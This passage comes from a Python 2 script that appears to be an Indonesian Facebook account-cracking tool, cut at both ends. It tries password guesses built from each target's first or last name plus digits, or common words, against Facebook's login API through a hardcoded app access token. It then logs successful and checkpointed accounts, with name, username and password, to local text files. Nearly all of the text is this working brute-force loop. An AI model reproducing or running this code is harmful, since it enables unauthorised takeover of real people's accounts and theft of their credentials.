						print ("\n\x1b[1;32mSUCCESS")
					        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos2
						oke = open("done/likes.txt", "a")
						oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;31mCHEKPOINT")
					                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos2
							cek = open("done/likes.txt", "a")
							cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;32mSUCCESS")
					                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos3
								oke = open("done/likes.txt", "a")
								oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;31mCHECKPOINT")
					                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos3
									cek = open("done/likes.txt", "a")
									cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['last_name'].lower()+'123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;33mSUCCESS")
					                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos4
										oke = open("done/likes.txt", "a")
										oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;31mCHECKPOINT")
					                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos4
											cek = open("done/likes.txt", "a")
											cek.write("\n{×} CHEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['last_name'].lower()+'1234'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;33mSUCCESS")
					                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos5
												oke = open("done/likes.txt", "a")
												oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;31mCHECKPOINT")
					                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos5
													cek = open("done/likes.txt", "a")
													cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['last_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;33mSUCCESS")
					                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos6
											                	oke = open("done/likes.txt", "a")
														oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;31mCHECKPOINT")
					                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
					                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
					                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos6
															cek = open("done/likes.txt", "a")
															cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
                                                                                                                else:
                                                                                                                        bos7 = j['last_name'].lower()+'123456'
                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                        ko = json.load(data)
                                                                                                                        if 'access_token' in ko:
                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos7
                                                                                                                                oke = open("done/likes.txt", "a")
                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos7+"\n")
                                                                                                                                oke.close()
                                                                                                                                oks.append(zowe)
                                                                                                                        else:
                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos7
                                                                                                                                        cek = open("done/likes.txt", "a")
                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos7+"\n")
                                                                                                                                        cek.close()
                                                                                                                                        cekpoint.append(zowe)
                                                                                                                                else:
                                                                                                                                        bos8 = j['first_name'].lower()+'123456'
                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                        ko = json.load(data)
                                                                                                                                        if 'access_token' in ko:
                                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos8
                                                                                                                                                oke = open("done/likes.txt", "a")
                                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos8+"\n")
                                                                                                                                                oke.close()
                                                                                                                                                oks.append(zowe)
                                                                                                                                        else:
                                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos8
                                                                                                                                                        cek = open("done/follow.txt", "a")
                                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos8+"\n")
                                                                                                                                                        cek.close()
                                                                                                                                                        cekpoint.append(zowe)
                                                                                                                                                else:
                                                                                                                                                        bos9 = j['first_name'].lower()+'12'
                                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                                        ko = json.load(data)
                                                                                                                                                        if 'access_token' in ko:
                                                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos9
                                                                                                                                                                oke = open("done/follow.txt", "a")
                                                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos9+"\n")
                                                                                                                                                                oke.close()
                                                                                                                                                                oks.append(zowe)
                                                                                                                                                        else:
                                                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos9
                                                                                                                                                                        cek = open("done/follow.txt", "a")
                                                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos9+"\n")
                                                                                                                                                                        cek.close()
                                                                                                                                                                        cekpoint.append(zowe)
                                                                                                                                                                else:
                                                                                                                                                                        bos10 = j['last_name'].lower()+'12'
                                                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                                                        ko = json.load(data)
                                                                                                                                                                        if 'access_token' in ko:
                                                                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos10
                                                                                                                                                                                oke = open("done/likes.txt", "a")
                                                                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos10+"\n")
                                                                                                                                                                                oke.close()
                                                                                                                                                                                oks.append(zowe)
                                                                                                                                                                        else:
                                                                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos10
                                                                                                                                                                                        cek = open("done/follow.txt", "a")
                                                                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos10+"\n")
                                                                                                                                                                                        cek.close()
                                                                                                                                                                                        cekpoint.append(zowe)
                                                                                                                                                                                else:
                                                                                                                                                                                        bos11 = j['last_name'].lower()+'321'
                                                                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                                                                        ko = json.load(data)
                                                                                                                                                                                        if 'access_token' in ko:
                                                                                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos11
                                                                                                                                                                                                oke = open("done/likes.txt", "a")
                                                                                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos11+"\n")
                                                                                                                                                                                                oke.close()
                                                                                                                                                                                                oks.append(zowe)
                                                                                                                                                                                        else:
                                                                                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos11
                                                                                                                                                                                                        cek = open("done/follow.txt", "a")
                                                                                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos11+"\n")
                                                                                                                                                                                                        cek.close()
                                                                                                                                                                                                        cekpoint.append(zowe)
                                                                                                                                                                                                else:
                                                                                                                                                                                                        bos12 = j['first_name'].lower()+'321'
                                                                                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                                                                                        ko = json.load(data)
                                                                                                                                                                                                        if 'access_token' in ko:
                                                                                                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos12
                                                                                                                                                                                                                oke = open("done/likes.txt", "a")
                                                                                                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos12+"\n")
                                                                                                                                                                                                                oke.close()
                                                                                                                                                                                                                oks.append(zowe)
                                                                                                                                                                                                        else:
                                                                                                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos12
                                                                                                                                                                                                                        cek = open("done/follow.txt", "a")
                                                                                                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos12+"\n")
                                                                                                                                                                                                                        cek.close()
                                                                                                                                                                                                                        cekpoint.append(zowe)
                                                                                                                                                                                                                else:
                                                                                                                                                                                                                        bos13 = ('sayang')
                                                                                                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                                                                                                        ko = json.load(data)
                                                                                                                                                                                                                        if 'access_token' in ko:
                                                                                                                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos13
                                                                                                                                                                                                                                oke = open("done/likes.txt", "a")
                                                                                                                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos13+"\n")
                                                                                                                                                                                                                                oke.close()
                                                                                                                                                                                                                                oks.append(zowe)
                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos13
                                                                                                                                                                                                                                        cek = open("done/follow.txt", "a")
                                                                                                                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos13+"\n")
                                                                                                                                                                                                                                        cek.close()
                                                                                                                                                                                                                                        cekpoint.append(zowe)
                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                        bos14 = ('anjing')
                                                                                                                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                                                                                                                        ko = json.load(data)
                                                                                                                                                                                                                                        if 'access_token' in ko:
                                                                                                                                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos14
                                                                                                                                                                                                                                                oke = open("done/likes.txt", "a")
                                                                                                                                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos14+"\n")
                                                                                                                                                                                                                                                oke.close()
                                                                                                                                                                                                                                                oks.append(zowe)
                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos14
                                                                                                                                                                                                                                                        cek = open("done/follow.txt", "a")
                                                                                                                                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos14+"\n")
                                                                                                                                                                                                                                                        cek.close()
                                                                                                                                                                                                                                                        cekpoint.append(zowe)
                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                        bos15 = ('bangsat')
                                                                                                                                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos15)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                                                                                                                                        ko = json.load(data)
                                                                                                                                                                                                                                                        if 'access_token' in ko:
                                                                                                                                                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos15
                                                                                                                                                                                                                                                                oke = open("done/likes.txt", "a")
                                                                                                                                                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos15+"\n")
                                                                                                                                                                                                                                                                oke.close()
                                                                                                                                                                                                                                                                oks.append(zowe)
                                                                                                                                                                                                                                                        else:
                                                                                                                                                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos15
                                                                                                                                                                                                                                                                        cek = open("done/follow.txt", "a")
                                                                                                                                                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos15+"\n")
                                                                                                                                                                                                                                                                        cek.close()
                                                                                                                                                                                                                                                                        cekpoint.append(zowe)
                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                        bos16 = ('kontol')
                                                                                                                                                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos16)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                                                                                                                                                        ko = json.load(data)
                                                                                                                                                                                                                                                                        if 'access_token' in ko:
                                                                                                                                                                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                                                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos16
                                                                                                                                                                                                                                                                                oke = open("done/likes.txt", "a")
                                                                                                                                                                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos16+"\n")
                                                                                                                                                                                                                                                                                oke.close()
                                                                                                                                                                                                                                                                                oks.append(zowe)
                                                                                                                                                                                                                                                                         else:
                                                                                                                                                                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                                                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                                                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos16
                                                                                                                                                                                                                                                                                        cek = open("done/follow.txt", "a")
                                                                                                                                                                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos16+"\n")
                                                                                                                                                                                                                                                                                        cek.close()
                                                                                                                                                                                                                                                                                        cekpoint.append(zowe)
                                                                                                                                                                                                                                                                                else:
                                                                                                                                                                                                                                                                                        bos17 = ('123456')
                                                                                                                                                                                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos17)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                                                                                                                                                                        ko = json.load(data)
                                                                                                                                                                                                                                                                                        if 'access_token' in ko:
                                                                                                                                                                                                                                                                                                print ("\n\x1b[1;33mSUCCESS")
                                                                                                                                                                                                                                                                                                print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                                                                                                print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                                                                                                print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos17
                                                                                                                                                                                                                                                                                                oke = open("done/likes.txt", "a")
                                                                                                                                                                                                                                                                                                oke.write("\n{✓} BERHASIL \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos17+"\n")
                                                                                                                                                                                                                                                                                                oke.close()
                                                                                                                                                                                                                                                                                                oks.append(zowe)
                                                                                                                                                                                                                                                                                         else:
                                                                                                                                                                                                                                                                                                if 'www.facebook.com' in ko['error_msg']:
                                                                                                                                                                                                                                                                                                        print ("\n\x1b[1;31mCHECKPOINT")
                                                                                                                                                                                                                                                                                                        print ("\x1b[1;33mNama  \x1b[1;31m    : \x1b[1;32m") + j['name']
                                                                                                                                                                                                                                                                                                        print ("\x1b[1;33mUser  \x1b[1;31m    : \x1b[1;32m") + zowe
                                                                                                                                                                                                                                                                                                        print ("\x1b[1;33mPassword  \x1b[1;31m: \x1b[1;32m") + bos17
                                                                                                                                                                                                                                                                                                        cek = open("done/follow.txt", "a")
                                                                                                                                                                                                                                                                                                        cek.write("\n{×} CHEKPOINT \n{>} Nama     > " +j['name']+ "\n{>} User     > " +zowe+ "\n{>} Password > " +bos17+"\n")
                                                                                                                                                                                                                                                                                                        cek.close()
